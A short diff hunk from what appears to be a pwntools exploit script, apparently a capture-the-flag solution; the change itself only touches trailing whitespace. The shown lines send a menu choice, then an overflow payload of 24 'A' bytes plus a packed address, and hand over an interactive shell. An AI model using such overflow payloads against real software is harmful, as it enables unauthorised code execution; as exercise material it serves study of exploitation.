@@ -27,6 +27,4 @@ sh.recvuntil('>')
 sh.sendline('3')
 sh.recvline()
 sh.sendline('A' * 24 + p64(name))
-sh.interactive()
-
-			
+sh.interactive()	
